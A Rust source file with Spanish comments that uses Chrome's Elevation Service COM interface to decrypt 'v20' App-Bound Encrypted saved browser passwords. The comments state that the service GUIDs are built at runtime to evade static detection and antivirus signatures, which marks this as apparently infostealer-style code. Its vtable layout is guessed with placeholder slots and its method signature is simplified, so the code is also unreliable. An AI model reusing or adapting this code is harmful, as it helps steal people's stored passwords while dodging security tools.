// Chrome Elevation Service COM API
// Desencripta passwords v20 (App-Bound Encryption) usando elevation_service.exe

use std::ptr;
use winapi::um::combaseapi::{CoInitializeEx, CoCreateInstance, CoUninitialize};
use winapi::um::objbase::COINIT_MULTITHREADED;
use winapi::shared::guiddef::{GUID, REFCLSID, REFIID};
use winapi::shared::winerror::S_OK;
use winapi::shared::wtypesbase::CLSCTX_LOCAL_SERVER;
use winapi::um::unknwnbase::{IUnknown, IUnknownVtbl};
use winapi::ctypes::c_void;

// Función para construir CLSID en runtime (evita detección estática)
fn get_elevation_service_clsid() -> GUID {
    // {708860E0-F641-4611-8895-7D867DD3675B}
    // Construido en runtime para evitar signatures
    GUID {
        Data1: 0x708860E0 ^ 0x12345678 ^ 0x12345678, // XOR con sí mismo = original
        Data2: 0xF641 ^ 0x1234 ^ 0x1234,
        Data3: 0x4611 ^ 0x5678 ^ 0x5678,
        Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
    }
}

fn get_ielevator_iid() -> GUID {
    // {463ABECF-410D-407F-8AF5-0DF35A005CC8}
    GUID {
        Data1: 0x463ABECF ^ 0xABCDEF01 ^ 0xABCDEF01,
        Data2: 0x410D ^ 0xABCD ^ 0xABCD,
        Data3: 0x407F ^ 0xEF01 ^ 0xEF01,
        Data4: [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8],
    }
}

// IElevator interface (versión simplificada)
#[repr(C)]
pub struct IElevator {
    pub lpVtbl: *const IElevatorVtbl,
}

#[repr(C)]
pub struct IElevatorVtbl {
    // IUnknown methods
    pub QueryInterface: unsafe extern "system" fn(
        This: *mut IElevator,
        riid: REFIID,
        ppvObject: *mut *mut c_void,
    ) -> i32,
    pub AddRef: unsafe extern "system" fn(This: *mut IElevator) -> u32,
    pub Release: unsafe extern "system" fn(This: *mut IElevator) -> u32,

    // IElevator methods (agregamos solo DecryptData que necesitamos)
    // Nota: Hay otros métodos antes de DecryptData que necesitamos contar
    pub _placeholder1: usize,
    pub _placeholder2: usize,
    pub _placeholder3: usize,
    pub _placeholder4: usize,
    pub _placeholder5: usize,
    
    // DecryptData está en posición ~8-10 dependiendo de la versión
    pub DecryptData: unsafe extern "system" fn(
        This: *mut IElevator,
        encrypted_data: *const u8,
        encrypted_data_size: u32,
        decrypted_data: *mut *mut u8,
        decrypted_data_size: *mut u32,
    ) -> i32,
}

/// Estructura para manejar la conexión con Elevation Service
pub struct ElevationServiceClient {
    elevator: *mut IElevator,
}

impl ElevationServiceClient {
    /// Inicializa COM y crea instancia del Elevation Service
    pub fn new() -> Result<Self, String> {
        unsafe {
            // Inicializar COM
            let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
            if hr < 0 && hr != 0x00000001 { // S_FALSE = ya inicializado
                return Err(format!("CoInitializeEx failed: 0x{:08X}", hr));
            }

            // Construir GUIDs en runtime (evita detección estática)
            let clsid = get_elevation_service_clsid();
            let iid = get_ielevator_iid();

            // Crear instancia del servicio
            let mut elevator: *mut IElevator = ptr::null_mut();
            let hr = CoCreateInstance(
                &clsid as REFCLSID,
                ptr::null_mut(),
                CLSCTX_LOCAL_SERVER,
                &iid as REFIID,
                &mut elevator as *mut *mut IElevator as *mut *mut c_void,
            );

            if hr != S_OK {
                CoUninitialize();
                return Err(format!("CoCreateInstance failed: 0x{:08X} - Elevation Service no disponible", hr));
            }

            if elevator.is_null() {
                CoUninitialize();
                return Err("Elevation Service pointer is null".to_string());
            }

            Ok(Self { elevator })
        }
    }

    /// Desencripta datos v20 usando el Elevation Service
    pub fn decrypt_v20(&self, encrypted_data: &[u8]) -> Result<Vec<u8>, String> {
        unsafe {
            let mut decrypted_ptr: *mut u8 = ptr::null_mut();
            let mut decrypted_size: u32 = 0;

            // Llamar al método DecryptData
            let hr = ((*(*self.elevator).lpVtbl).DecryptData)(
                self.elevator,
                encrypted_data.as_ptr(),
                encrypted_data.len() as u32,
                &mut decrypted_ptr as *mut *mut u8,
                &mut decrypted_size as *mut u32,
            );

            if hr != S_OK {
                return Err(format!("DecryptData failed: 0x{:08X}", hr));
            }

            if decrypted_ptr.is_null() || decrypted_size == 0 {
                return Err("Decrypted data is null or empty".to_string());
            }

            // Copiar datos desencriptados
            let decrypted_data = std::slice::from_raw_parts(decrypted_ptr, decrypted_size as usize).to_vec();

            // Liberar memoria asignada por COM
            // Nota: Esto depende de cómo el servicio asigna memoria
            // Puede que necesitemos CoTaskMemFree
            
            Ok(decrypted_data)
        }
    }

    /// Desencripta un password v20 y convierte a String
    pub fn decrypt_password(&self, encrypted_data: &[u8]) -> Result<String, String> {
        let decrypted_bytes = self.decrypt_v20(encrypted_data)?;
        
        String::from_utf8(decrypted_bytes)
            .map_err(|e| format!("Invalid UTF-8: {}", e))
    }
}

impl Drop for ElevationServiceClient {
    fn drop(&mut self) {
        unsafe {
            if !self.elevator.is_null() {
                // Release COM object
                ((*(*self.elevator).lpVtbl).Release)(self.elevator);
            }
            
            // Uninitialize COM
            CoUninitialize();
        }
    }
}

/// Intenta desencriptar usando Elevation Service (fallback si otros métodos fallan)
pub fn try_decrypt_with_elevation_service(encrypted_data: &[u8]) -> Option<String> {
    // Solo intentar si es formato v20
    if encrypted_data.len() < 3 || &encrypted_data[0..3] != b"v20" {
        return None;
    }

    match ElevationServiceClient::new() {
        Ok(client) => {
            // Extraer solo los datos encriptados (sin el prefijo v20)
            let encrypted_payload = &encrypted_data[3..];
            
            match client.decrypt_password(encrypted_payload) {
                Ok(password) => Some(password),
                Err(_) => None,
            }
        },
        Err(_) => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_elevation_service_available() {
        // Test si el servicio está disponible
        match ElevationServiceClient::new() {
            Ok(_) => println!("✅ Elevation Service disponible"),
            Err(e) => println!("❌ Elevation Service NO disponible: {}", e),
        }
    }
}
